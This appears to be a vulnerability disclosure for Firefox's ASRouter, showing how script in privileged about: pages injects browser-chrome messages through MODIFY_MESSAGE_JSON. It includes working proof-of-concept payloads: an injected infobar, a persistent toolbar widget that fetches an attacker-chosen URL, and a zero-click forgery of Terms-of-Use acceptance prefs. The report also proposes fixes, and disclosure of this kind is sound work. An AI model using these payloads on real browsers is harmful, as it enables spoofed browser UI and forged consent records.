# ASRouter: a page in about:welcome / about:newtab can inject an arbitrary message and have the parent render it as browser chrome (`MODIFY_MESSAGE_JSON`)

**Component:** Firefox :: Messaging System
**Affected:** Firefox 153.0.1 (release) **and 152.0.6** — the injection route and all three legs below
are present in both (verified against both source trees); verify at tip before filing
**Severity (my assessment):** Moderate–High — attacker-authored browser chrome (infobar / spotlight /
menu message) with buttons wired to `SpecialMessageActions`, a **persistent toolbar widget**, and a
**confirmed chrome-side fetch to an arbitrary `http://` URL** that the page's own CSP forbids
**Precondition:** script running in one of `about:welcome`, `about:newtab`, `about:home`,
`about:privatebrowsing`, `about:asrouter` (privilegedabout). **No web-content path is claimed.**
**Status:** **RUNTIME-CONFIRMED** on stock 153.0.1 (Linux) — page-authored message rendered as a global
infobar; and, via `bookmarks_bar_button`, a persistent toolbar widget plus a chrome-side fetch to
`http://127.0.0.1` captured at a listener

---

## Summary

`ASRouterChild` exports `ASRouterMessage` into page scope for every page the actor matches:

```js
// browser/components/asrouter/actors/ASRouterChild.sys.mjs:31-40  (actorCreated)
Cu.exportFunction(this.asRouterMessage.bind(this), window, { defineAs: "ASRouterMessage" });
```

The only filter is membership in `MESSAGE_TYPE_LIST`:

```js
// ASRouterChild.sys.mjs:98
if (VALID_TYPES.has(type)) { ... return this.sendQuery(type, data); }
```

That list contains the administrative message types, separated from the rest by nothing more than a
comment:

```js
// browser/components/asrouter/modules/ActorConstants.mjs:24-45
  // Admin types
  "ADMIN_CONNECT_STATE",
  ...
  "OVERRIDE_MESSAGE",
  "MODIFY_MESSAGE_JSON",
  ...
```

`ASRouterParent` forwards every name without inspection:

```js
// browser/components/asrouter/actors/ASRouterParent.sys.mjs:92-96
receiveMessage({ name, data }) {
  return ASRouterParent.tabs.loadingMessageHandler.then(handler => {
    return handler.handleMessage(name, data, this.getTab());
  });
}
```

and the handler routes the page's own object as a message:

```js
// browser/components/asrouter/modules/ASRouterParentProcessMessageHandler.sys.mjs:129-131
case msg.MODIFY_MESSAGE_JSON: {
  return this._router.routeCFRMessage(data.content, browser, data, true);
}
```

`routeCFRMessage` performs **no schema validation** — it switches on `message.template` and hands the
object to the renderer for that template (`ASRouter.sys.mjs:1629+`).

Which pages get the actor:

```js
// browser/components/DesktopActorRegistry.sys.mjs:818-838
ASRouter: {
  child: { events: { DOMDocElementInserted: {} } },   // "makes methods available to the page js on load"
  matches: ["about:asrouter*", "about:welcome*", "about:privatebrowsing*",
            "about:newtab*", "about:home*"],
  remoteTypes: ["privilegedabout"],
},
```

---

## Runtime confirmation

Stock **Firefox 153.0.1**, fresh profile, started at `about:welcome`. Executed in **page scope**
(content context, no chrome privileges):

```js
window.ASRouterMessage({
  type: "MODIFY_MESSAGE_JSON",
  data: { content: {
    id: "SNOX_INFOBAR_PROBE",
    template: "infobar",
    content: {
      type: "global",
      text: "SNOX-ASROUTER-ROUTE-PROOF",
      buttons: [{ label: "ok", action: { type: "CANCEL" } }],
    },
  } },
});
```

Then read from chrome scope:

```
chrome notification state: {"nodes":["SNOX_INFOBAR_PROBE|SNOX-ASROUTER-ROUTE-PROOF"],"boxCount":1}
```

A message authored entirely by page script was rendered by the parent as a **global browser infobar**
carrying the attacker's text.

---

## Impact

**1. Attacker-authored browser chrome.** The infobar, spotlight dialog and menu-message templates are
browser UI, drawn outside the content area, which users are trained to trust as coming from Firefox
itself. Text, buttons and styling come from the injected message.

**2. Buttons are wired to `SpecialMessageActions`.** Each button carries an `action` object which is
dispatched through `SpecialMessageActions.handleAction` — the same 49-action surface reachable from
the `AWPage:SPECIAL_ACTION` route (see finding 04), including `SET_PREF`, `OPEN_URL`,
`INSTALL_ADDON_FROM_URL` and `FXA_SIGNIN_FLOW`. This converts a click on Firefox-looking chrome into
those actions.

**3. Parent-process fetch to an arbitrary URL (Windows/macOS).** With `template:
"toast_notification"`, the injected `content.image_url` reaches:

```js
// browser/components/asrouter/modules/ToastNotification.sys.mjs:159-174
const uri = Services.io.newURI(imageData.url);
const channel = Services.io.newChannelFromURI(
  uri, null,
  Services.scriptSecurityManager.getSystemPrincipal(),   // system principal
  null,
  Ci.nsILoadInfo.SEC_ALLOW_CROSS_ORIGIN_SEC_CONTEXT_IS_NULL,
  Ci.nsIContentPolicy.TYPE_IMAGE);
imageContainer = await ChromeUtils.fetchDecodedImage(uri, channel);
```

with no scheme or host restriction. On Windows there is a second path at `:133` (`fetch(imageData.url)`
for `.gif`). This matters for the same reason as bug 2060096: the pages that can reach this ship
`connect-src https:` with no `http:` in any directive, so page script cannot make a plaintext HTTP
request itself, but this makes one on its behalf from the parent.

---

## What I did not prove

- **The *toast* variant of the fetch is not runtime-confirmed** (the `bookmarks_bar_button` variant
  below **is**, on Linux). On Linux `showToastNotification` throws before
  reaching the image code:
  `NS_ERROR_NOT_IMPLEMENTED [nsIAlertsService.isFullscreen]` at `ToastNotification.sys.mjs:93`
  (`if (this.AlertsService.isFullscreen?.())`). The IDL documents this method as returning false "on
  other platforms" (`nsIAlertsService.idl:304-314`), so the Linux throw looks like an implementation
  gap rather than a deliberate gate — but I could not execute the leg, and I am not claiming it works
  until someone runs it on Windows or macOS. The **route** (page → parent → renderer) is confirmed
  independently by the infobar result above.
- **No web-content path.** Reaching `window.ASRouterMessage` requires script already running in one of
  the listed about: pages. I previously tried and failed to find a web→privilegedabout crossing, and
  I am not claiming one here.
- I measured `infobar`, `toast_notification` and `bookmarks_bar_button`. I have not enumerated the
  remaining templates (`spotlight`, `feature_callout`, `menu_message`, `smart_window_newtab_promo`,
  `update_action`), so there may be further sinks.
- `MenuMessage.sys.mjs:250` (`msgElement.imageURL = message.content.imageURL`) looks like the same
  chrome-side image-load shape but I did not execute it.

---

## Suggested fix

Split `MESSAGE_TYPE_LIST` into ordinary and administrative sets, and reject the administrative ones
unless the caller is `about:asrouter` (the devtools page they exist for) — the grouping comment in
`ActorConstants.mjs` already describes the intended boundary; it just is not enforced anywhere. The
check belongs in `ASRouterParent.receiveMessage`, where the actor knows its own
`browsingContext.currentURI`, rather than in the child (which is the process being restricted).

Separately, `routeCFRMessage` should validate an injected message against the existing message schema
before dispatching it to a renderer, so that a message reaching it out-of-band cannot carry arbitrary
`content` fields.

---

## Cross-platform escalation: `bookmarks_bar_button` — persistent toolbar widget + confirmed chrome-side fetch

The toast leg above is blocked on Linux. A second template is not, and it is strictly worse:
`bookmarks_bar_button` (`ASRouter.sys.mjs` switch → `BookmarksBarButton.showBookmarksBarButton`).

```js
// browser/components/asrouter/modules/BookmarksBarButton.sys.mjs:18-56
async showBookmarksBarButton(browser, message) {
  const { label, action, logo } = message.content;      // all attacker-supplied
  const widgetId = "fxms-bmb-button";
  const fxmsBookmarksBarBtn = {
    id: widgetId,
    label: label?.raw,                                   // attacker text
    defaultArea: lazy.CustomizableUI.AREA_BOOKMARKS,     // persistent toolbar widget
    type: "button",
    onCreated(aNode) {
      aNode.className = `bookmark-item chromeclass-toolbar-additional`;
      if (logo?.imageURL) {
        aNode.style.listStyleImage = `url(${logo.imageURL})`;   // chrome-document load, attacker URL
      }
      ...
    },
    onCommand() {
      if (supportedActions.includes(action.type)) {      // OPEN_URL | SET_PREF | MULTI_ACTION
        lazy.SpecialMessageActions.handleAction(action, gBrowser);
```

**RUNTIME-CONFIRMED on Linux, stock 153.0.1** (`poc_bookmarks_button.py`). Injected from about:welcome
page scope with `logo.imageURL` pointing at a local listener:

```
listener:
  GET /BMB-CHROME-IMAGE-FETCH
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
  Sec-Fetch-Dest: image
  Sec-Fetch-Site: none            <-- chrome-privileged load, not attributed to any page origin
  Sec-Fetch-Storage-Access: active

chrome DOM:
  {"widgetPresent":true,"label":"SNOX-BMB",
   "listStyleImage":"url(\"http://127.0.0.1:9433/BMB-CHROME-IMAGE-FETCH\")"}
```

Three results in one shot:

1. **A persistent widget was added to the bookmarks toolbar** (`fxms-bmb-button`) with attacker-chosen
   label, from page script. It is a `CustomizableUI` widget, i.e. it persists in the user's toolbar
   configuration.
2. **The browser fetched an attacker-chosen `http://` URL** — this is the same capability delta as bug
   2060096: about:welcome's CSP (`connect-src https:`, `img-src https: data: blob: chrome:`) contains no
   `http:`, so page script cannot make that request itself, yet this makes it on the page's behalf from
   a chrome document. `Sec-Fetch-Site: none` shows the load is not attributed to the page's origin.
3. **The widget's `onCommand` runs `SpecialMessageActions.handleAction`** for `OPEN_URL`, `SET_PREF`
   and `MULTI_ACTION` — so a click on a Firefox-native-looking toolbar button performs those actions.

This removes the platform caveat: the network leg of this report is confirmed on Linux and does not
depend on the Windows-only toast path.

### Checked and negative: `action_only` is not a zero-click primitive

For completeness — the `action_only` template dispatches `SpecialMessageActions.handleAction` with no
user interaction, but it is properly gated (`ASRouter.sys.mjs:1606-1627`):

```js
const ALLOWED_ACTION_MESSAGE_ACTIONS = ["CONFIRM_LAUNCH_ON_LOGIN", "PIN_FIREFOX_TO_TASKBAR"];
...
if (action.type === "MULTI_ACTION") {
  return Array.isArray(actions) && !!actions.length &&
         actions.every(nested => ALLOWED_ACTION_MESSAGE_ACTIONS.includes(nested?.type));
}
return ALLOWED_ACTION_MESSAGE_ACTIONS.includes(action.type);
```

Both allowed actions are backed by an OS-level consent prompt, and the allowlist is applied inside
`MULTI_ACTION` too. So arbitrary actions still require a user click on injected UI.

---

## Zero-click escalation: `impression_action` forges a Terms-of-Use acceptance record

Everything above needs the user to click the injected chrome. This does not.

An "impression action" is a special message action that fires automatically when a message is
**shown**, with no click. `InfoBar.sys.mjs:330-356`:

```js
handleImpressionAction(browser) {
  const ALLOWED_IMPRESSION_ACTIONS = ["SET_PREF"];
  const impressionAction = this.message.content.impression_action;   // attacker-supplied
  const actions = impressionAction.type === "MULTI_ACTION"
    ? impressionAction.data.actions : [impressionAction];

  actions.forEach(({ type, data, once }) => {
    if (!ALLOWED_IMPRESSION_ACTIONS.includes(type)) { return; }
    ...
    data.onImpression = true;
    lazy.SpecialMessageActions.handleAction({ type, data }, browser);
  });
}
```

called from `addImpression:359` ← `:222`, i.e. as soon as the infobar is rendered.

`SET_PREF` on the impression path is deliberately narrowed
(`SpecialMessageActions.sys.mjs:385-402`):

```js
// ...only prefs created on the fly are allowed. This is to ensure that adding
// the abililty to set any in-tree prefs with this feature undergoes code review.
const allowedSetOnImpressionPrefs = ["termsofuse.firstAcceptedDate", "termsofuse.acceptedDate"];
const allowedPrefsList = onImpression ? allowedSetOnImpressionPrefs : allowedPrefs;
if (!allowedPrefsList.includes(pref.name) && !pref.name.startsWith("messaging-system-action.")) {
  pref.name = `messaging-system-action.${pref.name}`;    // anything else is namespaced away
}
```

That narrowing works — an attempt to set `browser.startup.homepage` this way is silently rewritten to
`messaging-system-action.browser.startup.homepage` (verified: the real pref was unchanged and the
namespaced pref was written instead). **But the two prefs that remain reachable are the Terms-of-Use
acceptance timestamps**, and those are exactly the kind of record that should never be writable
without the user acting.

**RUNTIME-CONFIRMED, stock 153.0.1, zero user interaction** (`poc_zeroclick_tou_forgery.py`). Injected
from about:welcome page scope:

```js
window.ASRouterMessage({ type: "MODIFY_MESSAGE_JSON", data: { content: {
  id: "SNOX_IMPRESSION_ZEROCLICK", template: "infobar",
  content: {
    type: "global", text: "…", buttons: [{ label: "ok", action: { type: "CANCEL" } }],
    impression_action: { type: "SET_PREF",
      data: { pref: { name: "termsofuse.acceptedDate", value: "SNOX-FORGED-TOU-ACCEPTANCE" } } },
  },
} } });
```

```
BEFORE: {"tou1":"0","tou2":"0","ns":"<unset>"}
AFTER : {"tou1":"SNOX-FORGED-TOU-ACCEPTANCE","tou2":"0","ns":"<unset>",
         "infobars":["SNOX_IMPRESSION_ZEROCLICK"]}
```

`tou1` is `termsofuse.acceptedDate`; `ns` is the namespaced pref, still unset — confirming the write
reached the **real** pref rather than being rewritten. No click, no prompt.

This is the same class as finding 04 (consent-record forgery) but on a **zero-interaction** path.
`MULTI_ACTION` is accepted here too, so both ToU prefs can be written in one message.

**Version note (corrected).** I initially attributed this leg to code added in 153. That is wrong:
`InfoBar.handleImpressionAction` with `ALLOWED_IMPRESSION_ACTIONS = ["SET_PREF"]`, and
`allowedSetOnImpressionPrefs = ["termsofuse.firstAcceptedDate", "termsofuse.acceptedDate"]`
(`SpecialMessageActions.sys.mjs:365-368` in 152), are both present in **152.0.6** verbatim. What *is*
new in 153 is a different and weaker impression route —
`ASRouterScreenUtils.handleImpressionAction`, reachable from page scope via the exported
`AWSendImpressionAction`, but allowlisted to `PIN_FIREFOX_TO_TASKBAR` / `PIN_FIREFOX_TO_START_MENU`,
which the in-tree comment says are backed by an OS consent prompt.

Suggested fix for this leg specifically: impression actions should not be able to write consent
records at all — `termsofuse.*` acceptance timestamps should be set only by the ToU flow itself. The
existing namespacing fallback is the right default; these two entries are the exception that
undermines it.
